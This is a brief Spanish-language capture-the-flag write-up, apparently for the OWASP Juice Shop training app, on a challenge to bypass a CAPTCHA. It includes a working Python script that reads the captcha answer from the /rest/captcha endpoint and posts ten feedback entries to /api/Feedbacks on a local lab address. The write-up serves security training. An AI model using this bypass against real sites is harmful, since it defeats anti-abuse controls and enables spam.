# CAPTCHA Bypass
## Submit 10 or more customer feedbacks within 20 seconds.

El reto consiste en espamear la solucion de un capcha a la web.
Esto se logro con un script en python.
Para este se intercepto las peticiones de la pagina, viendo que la web hace una solicitud a `/api/FeedBacks` enviando los datos y luego a `/rest/capcha`.
Con esta info se creo un script en python que permita enviar varias peticiones al servidor.

``` python
import requests
import json

for x in range(0,10):

	# GET captcha id and answer
	r = requests.get("http://172.17.0.3:3000/rest/captcha/")
	data = r.json()

	captcha_id = data['captchaId']
	captcha_answer = data['answer']

	# POST form 

	# Create form parameters
	# sample parameters {"captchaId":11,"captcha":"17","comment":"asdasd","rating":5}
	json_obj = {"captchaId":captcha_id,"captcha":captcha_answer,"comment":"Mensaje","rating":1}

	headers = {
	'Content-type':'application/json', 
	'Accept':'application/json' }
	result = requests.post("http://172.17.0.3:3000/api/Feedbacks", data=json.dumps(json_obj), headers=headers)
	print(result)
	print(result.status_code)
	#print(result.json())
```
